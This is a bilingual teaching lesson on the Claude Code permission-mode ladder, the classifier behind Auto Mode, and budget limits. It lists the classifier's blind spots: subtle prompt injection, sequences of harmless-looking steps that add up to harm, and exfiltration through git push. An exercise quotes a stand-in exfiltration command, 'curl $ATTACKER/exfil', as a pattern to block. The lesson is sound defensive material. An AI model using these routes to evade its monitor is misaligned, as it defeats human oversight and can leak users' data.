# 自主 Agent 的權限模式階梯（Permission Modes for Autonomous Agents）

> 權限階梯（permission ladder）——從每步動作必經審查到全自動核准的分級自主權限——是治理框架在無需人工確認下約束自主 agent 行為邊界的核心手段。作為本課深入剖析的代表案例，Claude Code 提供了六種權限模式：「plan」在執行任何動作前皆須詢問；「default」（在 UI 中標示為「Manual」）僅對高風險動作進行確認；「acceptEdits」自動核准檔案寫入，但執行 shell 指令仍需人工確認；而「bypassPermissions」則無條件放行所有動作。Auto Mode（即 `auto` 權限模式）將逐動作的人工核准替換為獨立的分類器模型，在每個動作執行前進行審查，並阻擋任何超出原始請求範圍的越權升級。動作預算則透過 `max_turns` 與 `max_budget_usd` 進行硬性強制執行。能否啟用 `auto` 取決於訂閱方案、組織權限、選用模型與供應商——且 Anthropic 明確指出：單靠分類器本身並不足以確保安全。

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## The Problem｜問題

在你的本地主機上運作一個具備自主權限的程式碼編寫 agent，屬於一種獨立的資安類別。其攻擊表面涵蓋了該 agent 能夠觸及的一切資源——檔案系統、網路連線、憑證金鑰、剪貼簿、任何開啟的瀏覽器分頁以及任何執行中的終端機視窗。Bruce Schneier 等資安專家曾公開提出警示：能操作電腦的 agent 絕非傳統 chatbot 的單純「功能更新」，它們是一種新型工具，帶有新的風險特徵。

Claude Code 的權限系統正是 Anthropic 對此給出的工程答案。系統並未採用單一的「自主／非自主」二元開關，而是設計了跨越能力階梯的六種模式：plan → default → acceptEdits → … → bypassPermissions。每一種模式都代表著在執行速度與逐動作審查成本之間的特定取捨平衡。Auto Mode（2026 年 3 月推出）更額外引入了獨立的分類器模型，將核准流程從使用者的關鍵路徑中移出：它會在每個動作執行前進行前置審查，自動攔截任何超出任務意圖的越權升級。

核心工程問題在於：這套機制究竟能攔截什麼？會遺漏什麼？而面對給定的具體任務，到底該選用哪種權限模式才真正合理？

## The Concept｜核心概念

### 六大權限模式

| 模式 | 行為 | 使用時機 |
|---|---|---|
| `plan` | Agent 提出計畫；使用者核准整份計畫；每個動作在執行前都會被審查 | 不熟悉的任務；接近正式環境的程式碼；第一次在某個儲存庫使用 agent |
| `default` | 在 UI 中標示為「Manual」。Agent 執行動作；對任何「高風險」動作（shell 執行、破壞性操作、網路呼叫）提示使用者 | 多數互動式程式碼編寫工作階段（session） |
| `acceptEdits` | 檔案寫入自動核准；shell 執行與網路呼叫仍會提示 | 跨多個檔案的重構作業 |
| `auto` | 獨立的分類器模型在每個動作執行前進行審查；阻擋任何超出請求範圍的升級行為 | 在受限工作區中的長時程無人值守執行 |
| `dontAsk` | 從不提示；未經權限規則預先核准的動作一律拒絕 | 短暫沙盒、CI 工作、研究用程式檔案 |
| `bypassPermissions` | 核准所有動作 | 官方文件記載為「只應在你願意丟棄的短暫容器內使用」 |

（上述名稱與 Claude Code 公開官方文件一致；其 UI 介面將 `default` 標示為「Manual」。）

### 一頁讀懂 Auto Mode

Auto Mode（於 2026 年 3 月 24 日推出）是第一個將「逐動作核准」職責委託給 AI 模型執行的權限模式。其核心結構包含：

1. **獨立的分類器模型。** 在每個擬議動作執行之前進行審查，參照使用者宣告的任務與當前工作階段（session）狀態加以研判，阻擋任何超出原始請求範疇的越權行為。被阻擋的動作會退回給使用者確認。
2. **門禁式可用性控制。** 系統是否提供 `auto` 選項，受到使用者帳號方案、組織層級啟用設定、特定模型選擇與供應商環境的約束。

預算控制則與分類器並存：

- `max_turns`——單一工作階段中允許的總迭代輪次上限。
- `max_budget_usd`——觸發工作階段自動終止的美元預算上限。
- 單一工具的動作次數配額上限（例如限制最多執行 N 次 `WebFetch` 呼叫等）。

### 該系統能攔截的威脅

- 直接針對工具輸入的直白 prompt 注入攻擊（當注入的惡意指令符合已知高風險動作模式時）。
- 重複無效的工具迴圈呼叫——分類器能夠識別出動作 N+1 與動作 N 連續五次幾乎完全一致。
- 在原本僅需編輯檔案的工作階段中，突然嘗試執行明顯超出範圍的 shell 指令。

### 該系統可能漏掉的盲點

- **細微的 prompt 注入**：能夠調整 agent 後續行為模式，卻不會直接觸發單一違規動作。間接 prompt 注入並非能夠被完全修補的軟體漏洞（OpenAI 準備度主管於 2025 年針對瀏覽器 agent 提出的公開結論——詳見第 11 課）。
- **語意層級的惡意行為**：每一個單獨動作表面上看都無害且合理，但組合而成的完整軌跡卻具有破壞性。分類器評判的是當下單一動作；它無法重新推導使用者的意圖。
- **利用合法途徑竊取外洩資料**：將敏感資料寫入自己擁有的檔案，隨後執行 `git push` 推送至公開儲存庫；序列中的每個單獨動作都是被允許的，然而它們的組合正是問題所在。

### 研究預覽版（Research Preview）的定位

Anthropic 將 Auto Mode 定位為研究預覽版（research preview）。官方文件明確指出，分類器僅是其中一層，而非解決方案：使用者應將 Auto Mode 與預算、白名單、隔離工作區以及軌跡稽核（第 12–16 課）結合使用。預覽版的定調也反映了已有記錄的評測與正式環境落差（第 1 課）——通過離線評測的分類器，在使用者上下文模糊的真實工作階段中，行為可能不同。

### 權限階梯在工作流程中的實踐指引

- 面對不熟悉的新任務：從 `plan` 模式起步。閱讀規劃的成本，遠低於回滾一次有問題的執行。
- 針對已掌握的既有重構：選用 `acceptEdits` 能省下許多重複的確認點選。
- 無人值守的背景長時間執行：僅在已量化爆炸半徑（blast radius）的受限工作區內啟用 `auto`（確保無敏感憑證、無正式環境掛載、無未經明確許可的外部連線）。
- 短暫拋棄式容器：唯有當容器及其憑證都可以丟棄時，才可使用 `dontAsk` 或 `bypassPermissions`。

```figure
autonomy-oversight
```

## Use It｜實際應用

`code/main.py` 將動作審查分類器模擬為一個兩階段管線——這是一個教學上的簡化模型；真實的 `auto` 模式背後是一個獨立的分類器模型，而非具備兩階段契約的文件化實作。第一階段是以廉價的關鍵字規則過濾擬議動作；第二階段則是耗時較長的深層多規則審查器。執行主程式會輸入一條簡短的合成軌跡（包含安全動作、prompt 注入攻擊嘗試與重複迴圈），展示分類器在何處能成功攔截、又在何處會產生疏漏。

## Ship It｜交付成果

`outputs/skill-permission-mode-picker.md` 能根據具體的任務描述，自動匹配出最合適的權限模式、預算上限以及必要的環境隔離等級。

## Exercises｜練習

1. 執行 `code/main.py`。哪一種類型的合成動作從未被第一階段標記，但總是被第二階段捕獲？又有哪種類型的動作能同時逃過兩個階段的檢查？

2. 擴充第一階段的規則集，使其能夠攔截特定形式的已知惡意行為（例如 `curl $ATTACKER/exfil`）。在良性動作樣本上量化測量其偽陽性率。

3. 閱讀 Anthropic 的「Agent 迴圈運作機制」官方文件。列出在 `default` 模式下 agent 預設會觸及的所有外部狀態。在無人值守運作 `auto` 之前，哪些狀態需要獨立設定門禁？

4. 為一次長達 24 小時的無人值守執行設計完整的預算架構：包含 `max_turns`、`max_budget_usd`、各工具的次數配額上限以及白名單規則。針對每個數字給出具體的論證依據。

5. 描述一條軌跡場景：其中每一個單獨動作皆能獲得分類器的核准通過，但其組合而成的整體行為卻失準。（第 14 課將深入探討斷路開關與金絲雀 token 如何應對此類場景。）

## Key Terms｜關鍵術語

| 術語 | 常見說法 | 實際意義 |
|---|---|---|
| 權限模式 | 「agent 能做多少事」 | 控制逐動作核准的六種具名政策之一 |
| plan 模式 | 「任何事都先問」 | Agent 撰寫計畫；使用者在執行前核准 |
| acceptEdits | 「讓它寫檔案」 | 檔案寫入自動核准；shell 執行仍會提示 |
| auto | 「自動核准」 | 獨立的分類器模型審查每個動作；阻擋超出請求範圍的升級 |
| bypassPermissions | 「全開 YOLO」 | 核准所有動作；設計用於短暫容器 |
| 第一階段（模擬器） | 「快速關鍵字檢查」 | `code/main.py` 中對擬議動作的廉價規則 |
| 第二階段（模擬器） | 「深度審查」 | `code/main.py` 中針對被標記動作的較慢多規則審查器 |
| 研究預覽版 | 「尚未正式普遍提供」 | Anthropic 的用語，指失效模式仍在釐清中的功能 |

## Further Reading｜延伸閱讀

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 權限模式、預算控制與動作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — 代管型服務的執行架構。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — 功能全貌與 Auto Mode 正式發布公告。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 引導分類器價值研判的推理核心層。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 針對長時程權限架構設計的內部觀點。
